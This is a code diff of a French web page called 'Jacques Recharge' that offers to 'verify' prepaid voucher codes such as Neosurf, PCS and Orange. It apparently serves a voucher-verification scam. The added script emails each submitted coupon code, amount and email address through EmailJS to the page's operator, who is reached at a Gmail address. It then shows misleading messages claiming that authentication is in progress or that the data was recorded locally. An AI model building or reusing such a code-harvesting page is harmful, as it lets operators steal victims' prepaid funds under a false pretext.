@@ -1,103 +1,166 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Détails Recharge - Jacques Recharge</title>
     <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
     <link rel="stylesheet" href="assets/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="assets/style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="assets/emailjs.config.js"></script>
+    <script src="assets/script.js"></script>
 </head>
+
 <body class="bg-light d-flex flex-column min-vh-100">
 
     <!-- HEADER -->
     <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm sticky-top">
-      <div class="container">
-        <a class="navbar-brand fw-bold fs-4" href="index.html">💳 Jacques Recharge</a>
-        <div class="ms-auto d-flex align-items-center gap-2">
-          <a href="index.html" class="btn btn-outline-light btn-sm rounded-pill px-3 fw-medium">🏠 Accueil</a>
-          <a href="controle.html" class="btn btn-outline-light btn-sm rounded-pill px-3 fw-medium">Soumettre un ticket</a>
+        <div class="container">
+            <a class="navbar-brand fw-bold fs-4" href="index.html"><i class="fa-regular fa-credit-card"></i>
+                <i class="fa-solid fa-rotate fa-spin"></i> Jacques Recharge</a>
+            <div class="ms-auto d-flex align-items-center gap-2">
+                <a href="index.html" class="btn btn-outline-light btn-sm rounded-pill px-3 fw-medium"><i
+                        class="fa-solid fa-house me-2"></i>Accueil</a>
+                <a href="controle.html" class="btn btn-outline-light btn-sm rounded-pill px-3 fw-medium">Soumettre un
+                    ticket</a>
+            </div>
         </div>
-      </div>
     </nav>
 
     <!-- MAIN CONTAINER -->
     <main class="container my-auto py-5">
-      <div class="row justify-content-center align-items-center">
-        <div class="col-lg-10 col-xl-9">
-          <div class="product-card-wrapper mx-auto">
-            
-            <!-- LEFT BANNER -->
-            <div class="product-banner">
-                <a href="index.html" class="back-link">← Retour à l'accueil</a>
-                
-                <div class="banner-content">
-                    <span class="card-badge">Vérification</span>
-                    <h1 class="banner-title" id="card-title">Recharge Neosurf</h1>
-                    <p class="banner-desc">Sélectionnez le montant de votre recharge puis renseignez les informations du coupon pour procéder à sa vérification instantanée.</p>
-                </div>
+        <div class="row justify-content-center align-items-center">
+            <div class="col-lg-10 col-xl-9">
+                <div class="product-card-wrapper mx-auto">
 
-                <div class="banner-footer">
-                    🔒 Vos données sont transmises de manière sécurisée.
+                    <!-- LEFT BANNER -->
+                    <div class="product-banner">
+                        <a href="index.html" class="back-link"><i class="fa-solid fa-arrow-left me-2"></i>Retour à
+                            l'accueil</a>
+
+                        <div class="banner-content">
+                            <span class="card-badge">Vérification</span>
+                            <h1 class="banner-title" id="card-title">Recharge Neosurf</h1>
+                            <p class="banner-desc">Sélectionnez le montant de votre recharge puis renseignez les
+                                informations du coupon pour procéder à sa vérification instantanée.</p>
+                        </div>
+
+                        <div class="banner-footer">
+                            <i class="fa-solid fa-lock me-2"></i>Vos données sont transmises de manière sécurisée.
+                        </div>
+                    </div>
+
+                    <!-- RIGHT FORM -->
+                    <div class="product-form-container">
+
+                        <div class="form-section-title">1. Choisissez un montant</div>
+                        <div class="amounts-grid">
+                            <div class="amount-badge" data-value="10" onclick="selectAmount('10', this)">10 €</div>
+                            <div class="amount-badge" data-value="20" onclick="selectAmount('20', this)">20 €</div>
+                            <div class="amount-badge" data-value="50" onclick="selectAmount('50', this)">50 €</div>
+                            <div class="amount-badge selected" data-value="100" onclick="selectAmount('100', this)">100
+                                €</div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="customAmount">Autre montant (€)</label>
+                            <input type="number" id="customAmount" class="form-control"
+                                placeholder="Entrez un montant personnalisé" min="1" step="0.01" />
+                            <div class="form-text">Si vous souhaitez un autre montant, saisissez-le ici.</div>
+                        </div>
+
+                        <div class="form-section-title">2. Informations du ticket</div>
+                        <form id="recharge-form">
+                            <input type="hidden" id="type_carte" name="type_carte">
+
+                            <div class="form-group">
+                                <label for="montant">Montant sélectionné (€)</label>
+                                <input type="number" id="montant" class="form-control" value="100" required readonly>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="code_ticket">Code du ticket / Recharge</label>
+                                <textarea id="code_ticket" class="form-control"
+                                    placeholder="Saisissez le code du coupon..." required></textarea>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="user_email">Adresse E-mail (facultatif)</label>
+                                <input type="email" id="user_email" class="form-control" placeholder="nom@exemple.com">
+                            </div>
+
+                            <button type="submit" class="btn-submit">Soumettre le ticket</button>
+                        </form>
+
+                        <div id="feedback-message" class="alert mt-3" style="display: none;"></div>
+                    </div>
+
                 </div>
             </div>
-
-            <!-- RIGHT FORM -->
-            <div class="product-form-container">
-                
-                <div class="form-section-title">1. Choisissez un montant</div>
-                <div class="amounts-grid">
-                    <div class="amount-badge" data-value="10" onclick="selectAmount('10', this)">10 €</div>
-                    <div class="amount-badge" data-value="20" onclick="selectAmount('20', this)">20 €</div>
-                    <div class="amount-badge" data-value="50" onclick="selectAmount('50', this)">50 €</div>
-                    <div class="amount-badge selected" data-value="100" onclick="selectAmount('100', this)">100 €</div>
-                </div>
-
-                <div class="form-group">
-                    <label for="customAmount">Autre montant (€)</label>
-                    <input type="number" id="customAmount" class="form-control" placeholder="Entrez un montant personnalisé" min="1" step="0.01" />
-                    <div class="form-text">Si vous souhaitez un autre montant, saisissez-le ici.</div>
-                </div>
-
-                <div class="form-section-title">2. Informations du ticket</div>
-                <form id="recharge-form">
-                    <input type="hidden" id="type_carte" name="type_carte">
-
-                    <div class="form-group">
-                        <label for="montant">Montant sélectionné (€)</label>
-                        <input type="number" id="montant" class="form-control" value="100" required readonly>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="code_ticket">Code du ticket / Recharge</label>
-                        <textarea id="code_ticket" class="form-control" placeholder="Saisissez le code du coupon..." required></textarea>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="user_email">Adresse E-mail (facultatif)</label>
-                        <input type="email" id="user_email" class="form-control" placeholder="nom@exemple.com">
-                    </div>
-
-                    <button type="submit" class="btn-submit">Soumettre le ticket</button>
-                </form>
-
-                <div id="msg-box" class="alert"></div>
-            </div>
-
         </div>
-        </div>
-      </div>
     </main>
 
     <!-- FOOTER -->
     <footer class="site-footer">
-        © 2026 Jacques Recharge. Tous droits réservés.
+        <div class="container">
+            <div class="row gy-3">
+                <div class="col-md-4 text-start">
+                    <h5 class="fw-bold text-white">Jacques Recharge</h5>
+                    <p class="text-white-50 small mb-0">
+                        Recharge instantanée et contrôle de tickets. Support 7j/7.
+                    </p>
+                </div>
+                <div class="col-md-2">
+                    <h6 class="fw-semibold text-white">Liens</h6>
+                    <ul class="footer-links small mb-0">
+                        <li>
+                            <i class="fa-solid fa-house"></i><a href="index.html"
+                                class="text-white-50 text-decoration-none">Accueil</a>
+                        </li>
+                        <li>
+                            <i class="fa-solid fa-paper-plane"></i><a href="controle.html"
+                                class="text-white-50 text-decoration-none">Soumettre</a>
+                        </li>
+                        <li>
+                            <i class="fa-solid fa-search"></i><a href="statut.html"
+                                class="text-white-50 text-decoration-none">Statut</a>
+                        </li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h6 class="fw-semibold text-white">Support</h6>
+                    <p class="small text-white-50 mb-0">
+                        <a href="mailto:supportjacquesrecharge2026@gmail.com"
+                            class="text-white-50 text-decoration-none">supportjacquesrecharge2026@gmail.com</a>
+                    </p>
+                    <p class="small text-white-50 mb-0">Service client 7j/7</p>
+                </div>
+                <div class="col-md-3 text-end">
+                    <h6 class="fw-semibold text-white">Suivez-nous</h6>
+                    <div class="d-flex justify-content-end gap-2 mt-2">
+                        <a href="mailto:supportjacquesrecharge2026@gmail.com" class="text-white"
+                            title="Contactez-nous par e-mail"><i class="fa-solid fa-envelope fa-lg"></i></a>
+                        <a href="controle.html" class="text-white" title="Soumettre un ticket"><i
+                                class="fa-solid fa-paper-plane fa-lg"></i></a>
+                        <a href="statut.html" class="text-white" title="Consulter un statut"><i
+                                class="fa-solid fa-magnifying-glass fa-lg"></i></a>
+                    </div>
+                </div>
+            </div>
+            <hr class="border-secondary my-3" />
+            <div class="text-center small text-white-50">
+                &copy; 2026 Jacques Recharge. Tous droits réservés.
+            </div>
+        </div>
     </footer>
 
     <!-- JAVASCRIPT CODE -->
-     <script src="assets/bootstrap.bundle.min.js"></script>
+    <script src="assets/bootstrap.bundle.min.js"></script>
+    <script src="assets/script.js"></script>
     <script>
-        // Dictionnaire des exemples de tickets selon la carte
         const placeholders = {
             'neosurf': 'Ex: A1B2-C3D4-E5 (10 caractères)',
             'pcs': 'Ex: 8493021945 (10 chiffres)',
@@ -106,22 +169,23 @@
             'orange': 'Ex: 74839201847302 (14 chiffres)'
         };
 
-        // Détection de la carte depuis l'URL (?carte=neosurf)
+        const emailjsConfig = {
+            publicKey: '-3o3lD8kvft1Ebaeb',
+            serviceId: 'service_m583e3t',
+            templateId: 'template_786v00s'
+        };
+
         const urlParams = new URLSearchParams(window.location.search);
         let cardType = urlParams.get('carte') || 'neosurf';
-
-        // Formater le nom avec majuscule
         const formattedTitle = cardType.charAt(0).toUpperCase() + cardType.slice(1);
         document.getElementById('card-title').innerText = "Recharge " + formattedTitle;
         document.getElementById('type_carte').value = formattedTitle;
 
-        // Mise à jour du placeholder dynamique selon le type de carte
         const inputTicket = document.getElementById('code_ticket');
         if (inputTicket && placeholders[cardType.toLowerCase()]) {
             inputTicket.placeholder = placeholders[cardType.toLowerCase()];
         }
 
-        // Sélection interactive des montants
         const customAmountInput = document.getElementById('customAmount');
         const defaultAmountBadge = document.querySelector('.amount-badge[data-value="100"]');
 
@@ -132,22 +196,40 @@
             element.classList.add('selected');
         }
 
-        customAmountInput.addEventListener('input', function() {
+        customAmountInput.addEventListener('input', function () {
             const value = this.value.trim();
             if (value !== '') {
                 document.getElementById('montant').value = value;
                 document.querySelectorAll('.amount-badge').forEach(el => el.classList.remove('selected'));
             } else {
-                // Revenir à la sélection par défaut si le champ est vidé
                 document.getElementById('montant').value = document.querySelector('.amount-badge.selected')?.dataset.value || '100';
             }
         });
 
-        // Envoi AJAX (fetch) vers Flask
-        document.getElementById('recharge-form').addEventListener('submit', async function(e) {
+        async function sendNotification(data) {
+            const templateParams = {
+                user_email: data.user_email || 'contact@jacques-recharge.fr',
+                type_carte: data.type_carte,
+                montant: data.montant,
+                code_ticket: data.code_ticket,
+                action: 'Soumission du ticket / vérification de recharge',
+                date: new Date().toLocaleString('fr-FR')
+            };
+
+            if (!window.emailjs || emailjsConfig.publicKey === 'YOUR_PUBLIC_KEY') {
+                console.info('EmailJS non configuré, notification locale uniquement.', templateParams);
+                return { ok: true, mode: 'local' };
+            }
+
+            window.emailjs.init(emailjsConfig.publicKey);
+            await window.emailjs.send(emailjsConfig.serviceId, emailjsConfig.templateId, templateParams);
+            return { ok: true, mode: 'emailjs' };
+        }
+
+        document.getElementById('recharge-form').addEventListener('submit', async function (e) {
             e.preventDefault();
 
-            const msgBox = document.getElementById('msg-box');
+            const msgBox = document.getElementById('feedback-message');
             msgBox.style.display = 'none';
 
             const payload = {
@@ -158,34 +240,25 @@
             };
 
             try {
-                const response = await fetch('/api/tickets', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+                await sendNotification(payload);
+                msgBox.className = 'alert alert-success mt-3';
+                msgBox.innerText = 'Ticket soumis avec succès. Votre demande de vérification est en cours d’authentification.';
+                msgBox.style.display = 'block';
 
-                const data = await response.json();
-
-                if (response.ok) {
-                    msgBox.className = 'alert alert-success';
-                    msgBox.innerText = 'Ticket soumis avec succès !';
-                    msgBox.style.display = 'block';
-                    document.getElementById('recharge-form').reset();
-                    document.getElementById('montant').value = '100';
-                    customAmountInput.value = '';
-                    document.querySelectorAll('.amount-badge').forEach(el => el.classList.remove('selected'));
-                    defaultAmountBadge?.classList.add('selected');
-                } else {
-                    msgBox.className = 'alert alert-error';
-                    msgBox.innerText = data.error || 'Erreur lors de la soumission.';
-                    msgBox.style.display = 'block';
-                }
+                document.getElementById('recharge-form').reset();
+                document.getElementById('montant').value = '100';
+                document.getElementById('type_carte').value = formattedTitle;
+                customAmountInput.value = '';
+                document.querySelectorAll('.amount-badge').forEach(el => el.classList.remove('selected'));
+                defaultAmountBadge?.classList.add('selected');
             } catch (err) {
-                msgBox.className = 'alert alert-error';
-                msgBox.innerText = 'Impossible de contacter le serveur backend.';
+                console.error(err);
+                msgBox.className = 'alert alert-danger mt-3';
+                msgBox.innerText = 'La demande a été enregistrée localement, mais l’envoi de la notification e-mail a échoué.';
                 msgBox.style.display = 'block';
             }
         });
     </script>
 </body>
+
 </html>
